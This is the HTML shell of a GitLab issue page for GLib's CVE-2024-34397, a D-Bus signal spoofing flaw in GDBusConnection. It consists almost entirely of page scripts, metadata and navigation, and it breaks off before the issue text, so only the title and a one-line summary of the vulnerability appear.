



<!DOCTYPE html>
<html class="gl-light ui-gray with-top-bar with-header " lang="en">
<head prefix="og: http://ogp.me/ns#">
<meta charset="utf-8">
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1" name="viewport">
<title>CVE-2024-34397: GDBus signal subscriptions for well-known names are vulnerable to unicast spoofing (#3268) · Issues · GNOME / GLib · GitLab</title>
<script>
//<![CDATA[
window.gon={};gon.api_version="v4";gon.default_avatar_url="https://gitlab.gnome.org/assets/no_avatar-849f9c04a3a0d0cea2424ae97b27447dc64a7dbfae83c036c45b403392f0e8ba.png";gon.max_file_size=500;gon.asset_host=null;gon.webpack_public_path="/assets/webpack/";gon.relative_url_root="";gon.user_color_mode="gl-light";gon.user_color_scheme="white";gon.markdown_surround_selection=null;gon.markdown_automatic_lists=null;gon.math_rendering_limits_enabled=true;gon.recaptcha_api_server_url="https://www.recaptcha.net/recaptcha/api.js";gon.recaptcha_sitekey="6Lfhei8UAAAAAKwEVuEwxJX09r0AGdMm-DUTWNAQ";gon.gitlab_url="https://gitlab.gnome.org";gon.promo_url="https://about.gitlab.com";gon.forum_url="https://forum.gitlab.com";gon.docs_url="https://docs.gitlab.com";gon.revision="065e0c2f057";gon.feature_category="team_planning";gon.gitlab_logo="/assets/gitlab_logo-2957169c8ef64c58616a1ac3f4fc626e8a35ce4eb3ed31bb0d873712f2a041a0.png";gon.secure=true;gon.sprite_icons="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg";gon.sprite_file_icons="/assets/file_icons/file_icons-7cd3d6c3b29a6d972895f36472978a4b5adb4b37f9b5d0716a380e82389f7e0e.svg";gon.emoji_sprites_css_path="/assets/emoji_sprites-d746ae2450a3e9c626d338d77a101b84ff33a47c0c281b676d75c4a6ed2948a4.css";gon.emoji_backend_version=4;gon.gridstack_css_path="/assets/lazy_bundles/gridstack-5fcfd4ffbea1db04eaf7f16521bcab19ae3af042c8b4afe8d16781eda5a70799.css";gon.test_env=false;gon.disable_animations=null;gon.suggested_label_colors={"#cc338b":"Magenta-pink","#dc143c":"Crimson","#c21e56":"Rose red","#cd5b45":"Dark coral","#ed9121":"Carrot orange","#eee600":"Titanium yellow","#009966":"Green-cyan","#8fbc8f":"Dark sea green","#6699cc":"Blue-gray","#e6e6fa":"Lavender","#9400d3":"Dark violet","#330066":"Deep violet","#36454f":"Charcoal grey","#808080":"Gray"};gon.first_day_of_week=1;gon.time_display_relative=true;gon.time_display_format=0;gon.ee=false;gon.jh=false;gon.dot_com=false;gon.uf_error_prefix="UF";gon.pat_prefix="ggopat";gon.keyboard_shortcuts_enabled=true;gon.diagramsnet_url="https://embed.diagrams.net";gon.features={"sourceEditorToolbar":false,"vscodeWebIde":true,"uiForOrganizations":false,"organizationSwitching":false,"findAndReplace":false,"removeMonitorMetrics":true,"workItemsViewPreference":false,"searchButtonTopRight":false,"asyncSidebarCounts":false,"preserveMarkdown":false,"issuesGridView":false,"serviceDeskTicket":false,"issuesListDrawer":false,"notificationsTodosButtons":false,"glqlIntegration":false,"workItems":true,"workItemsBeta":false,"workItemsAlpha":false,"epicWidgetEditConfirmation":false,"namespaceLevelWorkItems":false};
//]]>
</script>


<script>
//<![CDATA[
var gl = window.gl || {};
gl.startup_calls = {"/GNOME/glib/-/issues/3268/related_branches":{},"/GNOME/glib/-/issues/3268/discussions.json?per_page=20":{},"/GNOME/glib/-/issues/3268.json?serializer=sidebar_extras":{}};
gl.startup_graphql_calls = [{"query":"query getDesignList($fullPath: ID!, $iid: String!, $atVersion: DesignManagementVersionID) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      designCollection {\n        __typename\n        copyState\n        designs(atVersion: $atVersion) {\n          __typename\n          nodes {\n            __typename\n            id\n            event\n            filename\n            notesCount\n            image\n            imageV432x230\n            currentUserTodos(state: pending) {\n              __typename\n              nodes {\n                __typename\n                id\n              }\n            }\n          }\n        }\n        versions {\n          __typename\n          nodes {\n            __typename\n            id\n            sha\n            createdAt\n            author {\n              __typename\n              id\n              name\n              avatarUrl\n            }\n          }\n        }\n      }\n    }\n  }\n}\n","variables":{"fullPath":"GNOME/glib","iid":"3268","atVersion":null}},{"query":"query permissions($fullPath: ID!, $iid: String!) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      userPermissions {\n        __typename\n        createDesign\n      }\n    }\n  }\n}\n","variables":{"fullPath":"GNOME/glib","iid":"3268"}}];

if (gl.startup_calls && window.fetch) {
  Object.keys(gl.startup_calls).forEach(apiCall => {
   gl.startup_calls[apiCall] = {
      fetchCall: fetch(apiCall, {
        // Emulate XHR for Rails AJAX request checks
        headers: {
          'X-Requested-With': 'XMLHttpRequest'
        },
        // fetch won’t send cookies in older browsers, unless you set the credentials init option.
        // We set to `same-origin` which is default value in modern browsers.
        // See https://github.com/whatwg/fetch/pull/585 for more information.
        credentials: 'same-origin'
      })
    };
  });
}
if (gl.startup_graphql_calls && window.fetch) {
  const headers = {"X-CSRF-Token":"a8ojp5ayj_KSaKmZHkTozxAxd8HQMtAxeX63EX3Mo0gqjYa33G7QeI0gTDzJ6T7o1G5sVOL_uGQitM3GJZ7eVA","x-gitlab-feature-category":"team_planning"};
  const url = `https://gitlab.gnome.org/api/graphql`

  const opts = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...headers,
    }
  };

  gl.startup_graphql_calls = gl.startup_graphql_calls.map(call => ({
    ...call,
    fetchCall: fetch(url, {
      ...opts,
      credentials: 'same-origin',
      body: JSON.stringify(call)
    })
  }))
}


//]]>
</script>



<link rel="stylesheet" href="/assets/application-2e69a08e74e113997b5ba7fc5cd3e020a6f407d9ad552675adc6d78c2b23d0f7.css" />
<link rel="stylesheet" href="/assets/page_bundles/design_management-55b7f0d1f8549b24ba19c0b5aaf18a17a8d3828677fad074d37dd2e69d08da2b.css" /><link rel="stylesheet" href="/assets/page_bundles/incidents-6598dbf61fe32a8ddb1b06150f2301451ad41554975581e771efc5f890d0443f.css" /><link rel="stylesheet" href="/assets/page_bundles/issuable-01914381150850b46ac12e613a08df1d9b815aa305882ef8482ccd64eda0773f.css" /><link rel="stylesheet" href="/assets/page_bundles/notes_shared-caf98f77b75b4b5399bdde69c069ee023fefdaa986d687c937e8010218785f51.css" /><link rel="stylesheet" href="/assets/page_bundles/issues_show-785541c300108b8ecf7c08fd02bd67f4d6b9d59c86918ecfbf91bae5e1c8ffa8.css" /><link rel="stylesheet" href="/assets/page_bundles/work_items-cbc6a2e1633c4e847a617e35cc4833b85b80816db688d3d6dd3cd31d4251bc53.css" /><link rel="stylesheet" href="/assets/page_bundles/labels-3508460b8d6f839e9d60de1f2065fdaf7f057efab04cf71966acef6a86fe9b41.css" /><link rel="stylesheet" href="/assets/page_bundles/commit_description-1e2cba4dda3c7b30dd84924809020c569f1308dea51520fe1dd5d4ce31403195.css" />
<link rel="stylesheet" href="/assets/application_utilities-0bfb919a8a7eb0e89544dfe328e69461ccb276a565685fdb6ae3b14f3db3f41b.css" />
<link rel="stylesheet" href="/assets/tailwind-016e83140c37d97dbdff0cef9c063fcd43d214866665fb783774776747928853.css" />


<link rel="stylesheet" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" />
<link rel="stylesheet" href="/assets/highlight/themes/white-5ffbb706faebead681b01c8b52e92c6c0d35ad5b1c11d39012c90bcaf7892ca8.css" />


<link rel="preload" href="/assets/application_utilities-0bfb919a8a7eb0e89544dfe328e69461ccb276a565685fdb6ae3b14f3db3f41b.css" as="style" type="text/css">
<link rel="preload" href="/assets/application-2e69a08e74e113997b5ba7fc5cd3e020a6f407d9ad552675adc6d78c2b23d0f7.css" as="style" type="text/css">
<link rel="preload" href="/assets/highlight/themes/white-5ffbb706faebead681b01c8b52e92c6c0d35ad5b1c11d39012c90bcaf7892ca8.css" as="style" type="text/css">




<script src="/assets/webpack/runtime.68fcb180.bundle.js" defer="defer"></script>
<script src="/assets/webpack/main.a4c9ae4f.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.admin.topics.edit-pages.admin.topics.new-pages.dashboar-c8f1318b.54872cef.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.dashboard.issues-pages.dashboard.milestones.show-pages.-13e11bbf.1a73330b.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.dashboard.issues-pages.groups.boards-pages.groups.issue-8dfa5f96.20262e8b.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.dashboard.issues-pages.groups.boards-pages.groups.issue-f804d6c2.d4f467df.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.groups.new-pages.import.gitlab_projects.new-pages.import.manifest.new-pages.projects.n-44c6c18e.800b02b5.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.search.show-super_sidebar.98a5daf8.chunk.js" defer="defer"></script>
<script src="/assets/webpack/super_sidebar.839aed14.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.projects-pages.projects.activity-pages.projects.alert_management.details-pages.project-2cf3f004.cf930f47.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.admin.topics.edit-pages.admin.topics.new-pages.groups.m-b59cd8e6.af19401d.chunk.js" defer="defer"></script>
<script src="/assets/webpack/5.7a5f7362.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.admin.topics.edit-pages.admin.topics.new-pages.groups.m-bfc75f5d.bc5ed18e.chunk.js" defer="defer"></script>
<script src="/assets/webpack/9.bc4d8be7.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.admin.topics.edit-pages.admin.topics.new-pages.groups.m-74b1dcb9.25b64210.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports-pages.admin.abuse_reports.show-pages.admin.groups.index-pages.admi-e271b53c.4fcbe683.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.topics.edit-pages.admin.topics.new-pages.groups.milestones.edit-pages.groups.mil-2f72a3d7.5269b7ea.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.admin.abuse_reports.show-pages.dashboard.milestones.show-pages.groups.merge_requests-p-6152ef8e.1d43fc45.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.dashboard.milestones.show-pages.groups.merge_requests-pages.groups.milestones.edit-pag-8e438287.4a86321e.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.dashboard.issues-pages.groups.issues-pages.groups.merge_requests-pages.groups.work_ite-dc744cb1.d70eece9.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.groups.issues-pages.groups.merge_requests-pages.groups.work_items-pages.groups.work_it-ed595783.87e56f63.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.groups.milestones.edit-pages.groups.milestones.new-pages.groups.milestones.show-pages.-7486cfee.c1a8fe55.chunk.js" defer="defer"></script>
<script src="/assets/webpack/commons-pages.groups.merge_requests-pages.groups.work_items-pages.groups.work_items.show-pages.proje-a6a6c699.b1ed2339.chunk.js" defer="defer"></script>
<script src="/assets/webpack/pages.projects.issues.show.af28b7e0.chunk.js" defer="defer"></script>

<meta content="object" property="og:type">
<meta content="GitLab" property="og:site_name">
<meta content="CVE-2024-34397: GDBus signal subscriptions for well-known names are vulnerable to unicast spoofing (#3268) · Issues · GNOME / GLib · GitLab" property="og:title">
<meta content=" Vulnerability summary Alicia Boya García discovered a security issue in GLib&#39;s GDBusConnection. When subscribing to a D-Bus signal using a..." property="og:description">
<meta content="https://gitlab.gnome.org/assets/twitter_card-570ddb06edf56a2312253c5872489847a0f385112ddbcd71ccfa1570febab5d2.jpg" property="og:image">
<meta content="64" property="og:image:width">
<meta content="64" property="og:image:height">
<meta content="https://gitlab.gnome.org/GNOME/glib/-/issues/3268" property="og:url">
<meta content="summary" property="twitter:card">
<meta content="CVE-2024-34397: GDBus signal subscriptions for well-known names are vulnerable to unicast spoofing (#3268) · Issues · GNOME / GLib · GitLab" property="twitter:title">
<meta content=" Vulnerability summary Alicia Boya García discovered a security issue in GLib&#39;s GDBusConnection. When subscribing to a D-Bus signal using a..." property="twitter:description">
<meta content="https://gitlab.gnome.org/assets/twitter_card-570ddb06edf56a2312253c5872489847a0f385112ddbcd71ccfa1570febab5d2.jpg" property="twitter:image">
<meta property="twitter:label1" content="Author"><meta property="twitter:data1" content="Alicia Boya García"><meta property="twitter:label2" content="Assignee"><meta property="twitter:data2" content="Philip Withnall">
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="GzBVcoE27mkrKd90VZ-MpIkgWUlBL5sWDWbuhZfrEvpad_Biy-qx4zRhOtGCMlqDTX9C3HPi80NWrJRSz7lv5g" />
<meta name="csp-nonce" />
<meta name="action-cable-url" content="/-/cable" />
<link href="/-/manifest.json" rel="manifest">
<link rel="icon" type="image/png" href="/uploads/-/system/appearance/favicon/1/GnomeLogoVertical.svg.png" id="favicon" data-original-href="/uploads/-/system/appearance/favicon/1/GnomeLogoVertical.svg.png" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/apple-touch-icon-b049d4bc0dd9626f31db825d61880737befc7835982586d015bded10b4435460.png" />
<link href="/search/opensearch.xml" rel="search" title="Search GitLab" type="application/opensearchdescription+xml">




<meta content=" Vulnerability summary Alicia Boya García discovered a security issue in GLib&#39;s GDBusConnection. When subscribing to a D-Bus signal using a..." name="description">
<meta content="#28272d" name="theme-color">
</head>

<body class="tab-width-8 gl-browser-chrome gl-platform-windows" data-find-file="/GNOME/glib/-/find_file/main" data-group="GNOME" data-group-full-path="GNOME" data-namespace-id="8" data-page="projects:issues:show" data-page-type-id="3268" data-project="glib" data-project-full-path="GNOME/glib" data-project-id="658">
<script>
//<![CDATA[
gl = window.gl || {};
gl.GfmAutoComplete = gl.GfmAutoComplete || {};
gl.GfmAutoComplete.dataSources = {"members":"/GNOME/glib/-/autocomplete_sources/members?type=Issue\u0026type_id=3268","issues":"/GNOME/glib/-/autocomplete_sources/issues","mergeRequests":"/GNOME/glib/-/autocomplete_sources/merge_requests","labels":"/GNOME/glib/-/autocomplete_sources/labels?type=Issue\u0026type_id=3268","milestones":"/GNOME/glib/-/autocomplete_sources/milestones","commands":"/GNOME/glib/-/autocomplete_sources/commands?type=Issue\u0026type_id=3268","snippets":"/GNOME/glib/-/autocomplete_sources/snippets","contacts":"/GNOME/glib/-/autocomplete_sources/contacts?type=Issue\u0026type_id=3268","wikis":"/GNOME/glib/-/autocomplete_sources/wikis"};


//]]>
</script>
<script>
//<![CDATA[
gl = window.gl || {};
gl.client = {"isChrome":true,"isWindows":true};


//]]>
</script>


<header class="header-logged-out" data-testid="navbar">
<a class="gl-sr-only gl-accessibility" href="#content-body">Skip to content</a>
<div class="container-fluid">
<nav aria-label="Explore GitLab" class="header-logged-out-nav gl-flex gl-gap-3 gl-justify-between">
<div class="gl-flex gl-items-center gl-gap-1">
<span class="gl-sr-only">GitLab</span>
<a title="Homepage" id="logo" class="header-logged-out-logo has-tooltip" aria-label="Homepage" href="/"><img class="brand-header-logo lazy" alt="" data-src="/uploads/-/system/appearance/header_logo/1/GnomeLogoHorizontal.svg" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" />
</a></div>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-grow">
<li class="header-logged-out-nav-item">
<a class="" href="/explore">Explore</a>
</li>
</ul>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-justify-end">
<li class="header-logged-out-nav-item">
<a href="/users/sign_in?redirect_to_referer=yes">Sign in</a>
</li>
</ul>
</nav>
</div>
</header>

<div class="layout-page page-gutter right-sidebar-expanded page-with-super-sidebar">
<aside class="js-super-sidebar super-sidebar super-sidebar-loading" data-command-palette="{&quot;project_files_url&quot;:&quot;/GNOME/glib/-/files/main?format=json&quot;,&quot;project_blob_url&quot;:&quot;/GNOME/glib/-/blob/main&quot;}" data-force-desktop-expanded-sidebar="" data-is-saas="false" data-root-path="/" data-sidebar="{&quot;is_logged_in&quot;:false,&quot;context_switcher_links&quot;:[{&quot;title&quot;:&quot;Explore&quot;,&quot;link&quot;:&quot;/explore&quot;,&quot;icon&quot;:&quot;compass&quot;}],&quot;current_menu_items&quot;:[{&quot;id&quot;:&quot;project_overview&quot;,&quot;title&quot;:&quot;GLib&quot;,&quot;entity_id&quot;:658,&quot;link&quot;:&quot;/GNOME/glib&quot;,&quot;link_classes&quot;:&quot;shortcuts-project&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;manage_menu&quot;,&quot;title&quot;:&quot;Manage&quot;,&quot;icon&quot;:&quot;users&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/GNOME/glib/activity&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;activity&quot;,&quot;title&quot;:&quot;Activity&quot;,&quot;link&quot;:&quot;/GNOME/glib/activity&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-activity&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;members&quot;,&quot;title&quot;:&quot;Members&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/project_members&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;labels&quot;,&quot;title&quot;:&quot;Labels&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/labels&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;plan_menu&quot;,&quot;title&quot;:&quot;Plan&quot;,&quot;icon&quot;:&quot;planning&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/issues&quot;,&quot;is_active&quot;:true,&quot;items&quot;:[{&quot;id&quot;:&quot;project_issue_list&quot;,&quot;title&quot;:&quot;Issues&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/issues&quot;,&quot;pill_count&quot;:&quot;925&quot;,&quot;link_classes&quot;:&quot;shortcuts-issues has-sub-items&quot;,&quot;is_active&quot;:true},{&quot;id&quot;:&quot;boards&quot;,&quot;title&quot;:&quot;Issue boards&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/boards&quot;,&quot;link_classes&quot;:&quot;shortcuts-issue-boards&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;milestones&quot;,&quot;title&quot;:&quot;Milestones&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/milestones&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;project_wiki&quot;,&quot;title&quot;:&quot;Wiki&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/wikis/home&quot;,&quot;link_classes&quot;:&quot;shortcuts-wiki&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;code_menu&quot;,&quot;title&quot;:&quot;Code&quot;,&quot;icon&quot;:&quot;code&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/merge_requests&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;project_merge_request_list&quot;,&quot;title&quot;:&quot;Merge requests&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/merge_requests&quot;,&quot;pill_count&quot;:&quot;43&quot;,&quot;link_classes&quot;:&quot;shortcuts-merge_requests&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;files&quot;,&quot;title&quot;:&quot;Repository&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/tree/main&quot;,&quot;link_classes&quot;:&quot;shortcuts-tree&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;branches&quot;,&quot;title&quot;:&quot;Branches&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/branches&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;commits&quot;,&quot;title&quot;:&quot;Commits&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/commits/main?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-commits&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;tags&quot;,&quot;title&quot;:&quot;Tags&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/tags&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;graphs&quot;,&quot;title&quot;:&quot;Repository graph&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/network/main?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-network&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;compare&quot;,&quot;title&quot;:&quot;Compare revisions&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/compare?from=main\u0026to=main&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;project_snippets&quot;,&quot;title&quot;:&quot;Snippets&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/snippets&quot;,&quot;link_classes&quot;:&quot;shortcuts-snippets&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;build_menu&quot;,&quot;title&quot;:&quot;Build&quot;,&quot;icon&quot;:&quot;rocket&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/pipelines&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;pipelines&quot;,&quot;title&quot;:&quot;Pipelines&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/pipelines&quot;,&quot;link_classes&quot;:&quot;shortcuts-pipelines&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;jobs&quot;,&quot;title&quot;:&quot;Jobs&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/jobs&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;pipeline_schedules&quot;,&quot;title&quot;:&quot;Pipeline schedules&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/pipeline_schedules&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;artifacts&quot;,&quot;title&quot;:&quot;Artifacts&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/artifacts&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;deploy_menu&quot;,&quot;title&quot;:&quot;Deploy&quot;,&quot;icon&quot;:&quot;deployments&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/releases&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;releases&quot;,&quot;title&quot;:&quot;Releases&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/releases&quot;,&quot;link_classes&quot;:&quot;shortcuts-deployments-releases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;container_registry&quot;,&quot;title&quot;:&quot;Container Registry&quot;,&quot;link&quot;:&quot;/GNOME/glib/container_registry&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;monitor_menu&quot;,&quot;title&quot;:&quot;Monitor&quot;,&quot;icon&quot;:&quot;monitor&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/issues/service_desk&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;service_desk&quot;,&quot;title&quot;:&quot;Service Desk&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/issues/service_desk&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;analyze_menu&quot;,&quot;title&quot;:&quot;Analyze&quot;,&quot;icon&quot;:&quot;chart&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/value_stream_analytics&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;cycle_analytics&quot;,&quot;title&quot;:&quot;Value stream analytics&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/value_stream_analytics&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-cycle-analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;contributors&quot;,&quot;title&quot;:&quot;Contributor analytics&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/graphs/main?ref_type=heads&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;ci_cd_analytics&quot;,&quot;title&quot;:&quot;CI/CD analytics&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/pipelines/charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;repository_analytics&quot;,&quot;title&quot;:&quot;Repository analytics&quot;,&quot;link&quot;:&quot;/GNOME/glib/-/graphs/main/charts&quot;,&quot;link_classes&quot;:&quot;shortcuts-repository-charts&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false}],&quot;current_context_header&quot;:&quot;Project&quot;,&quot;support_path&quot;:&quot;https://about.gitlab.com/get-help/&quot;,&quot;docs_path&quot;:&quot;/help/docs&quot;,&quot;display_whats_new&quot;:false,&quot;show_version_check&quot;:null,&quot;search&quot;:{&quot;search_path&quot;:&quot;/search&quot;,&quot;issues_path&quot;:&quot;/dashboard/issues&quot;,&quot;mr_path&quot;:&quot;/dashboard/merge_requests&quot;,&quot;autocomplete_path&quot;:&quot;/search/autocomplete&quot;,&quot;settings_path&quot;:&quot;/search/settings&quot;,&quot;search_context&quot;:{&quot;group&quot;:{&quot;id&quot;:8,&quot;name&quot;:&quot;GNOME&quot;,&quot;full_name&quot;:&quot;GNOME&quot;},&quot;group_metadata&quot;:{&quot;issues_path&quot;:&quot;/groups/GNOME/-/issues&quot;,&quot;mr_path&quot;:&quot;/groups/GNOME/-/merge_requests&quot;},&quot;project&quot;:{&quot;id&quot;:658,&quot;name&quot;:&quot;GLib&quot;},&quot;project_metadata&quot;:{&quot;mr_path&quot;:&quot;/GNOME/glib/-/merge_requests&quot;,&quot;issues_path&quot;:&quot;/GNOME/glib/-/issues&quot;},&quot;code_search&quot;:false,&quot;scope&quot;:&quot;issues&quot;,&quot;for_snippets&quot;:null}},&quot;panel_type&quot;:&quot;project&quot;,&quot;shortcut_links&quot;:[{&quot;title&quot;:&quot;Snippets&quot;,&quot;href&quot;:&quot;/explore/snippets&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-snippets&quot;},{&quot;title&quot;:&quot;Groups&quot;,&quot;href&quot;:&quot;/explore/groups&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-groups&quot;},{&quot;title&quot;:&quot;Projects&quot;,&quot;href&quot;:&quot;/explore/projects/starred&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-projects&quot;}],&quot;terms&quot;:&quot;/-/users/terms&quot;}"></aside>

<div class="content-wrapper">
<div class="broadcast-wrapper">




</div>
<div class="alert-wrapper alert-wrapper-top-space gl-flex gl-flex-col gl-gap-3 container-fluid container-limited">

























</div>
<div class="top-bar-fixed container-fluid" data-testid="top-bar">
<div class="top-bar-container gl-flex gl-items-center gl-gap-2">
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-start">
<button class="gl-button btn btn-icon btn-md btn-default btn-default-tertiary js-super-sidebar-toggle-expand super-sidebar-toggle -gl-ml-3" aria-controls="super-sidebar" aria-expanded="false" aria-label="Primary navigation sidebar" type="button"><svg class="s16 gl-icon gl-button-icon " data-testid="sidebar-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#sidebar"></use></svg>

</button>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"GNOME","item":"https://gitlab.gnome.org/GNOME"},{"@type":"ListItem","position":2,"name":"GLib","item":"https://gitlab.gnome.org/GNOME/glib"},{"@type":"ListItem","position":3,"name":"Issues","item":"https://gitlab.gnome.org/GNOME/glib/-/issues"},{"@type":"ListItem","position":4,"name":"#3268","item":"https://gitlab.gnome.org/GNOME/glib/-/issues/3268"}]}


</script>
<div data-testid="breadcrumb-links" id="js-vue-page-breadcrumbs-wrapper">
<div data-breadcrumbs-json="[{&quot;text&quot;:&quot;GNOME&quot;,&quot;href&quot;:&quot;/GNOME&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/group/avatar/8/gnomelogo.png&quot;},{&quot;text&quot;:&quot;GLib&quot;,&quot;href&quot;:&quot;/GNOME/glib&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;Issues&quot;,&quot;href&quot;:&quot;/GNOME/glib/-/issues&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;#3268&quot;,&quot;href&quot;:&quot;/GNOME/glib/-/issues/3268&quot;,&quot;avatarPath&quot;:null}]" id="js-vue-page-breadcrumbs"></div>
<div id="js-injected-page-breadcrumbs"></div>
</div>


</div>
<div class="gl-flex-none gl-flex gl-items-center gl-justify-center">
<div id="js-advanced-search-modal"></div>

</div>
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-end">
<div id="js-work-item-feedback"></div>


</div>
</div>
</div>

<div class="container-fluid container-limited limit-container-width project-highlight-puc">
